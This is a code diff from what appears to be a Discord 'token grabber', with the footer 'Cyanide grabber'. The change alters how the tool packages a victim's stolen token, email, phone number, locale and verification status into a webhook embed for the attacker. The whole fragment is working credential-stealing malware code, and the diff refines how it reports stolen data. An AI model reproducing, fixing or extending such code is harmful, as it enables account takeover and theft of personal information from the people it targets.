@@ -122,7 +122,11 @@ class Main:
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
-            embed.add_embed_field(name='Phone', value=str(userinfo["phone"]))
+            if userinfo["phone"] == None:
+                embed.add_embed_field(name='Phone', value="No phone number")
+            else:
+                embed.add_embed_field(name='Phone', value=userinfo["phone"])
+                
             embed.add_embed_field(name='Verified', value=str(userinfo["verified"]))
             embed.set_footer(text='By Cyanide grabber')
 
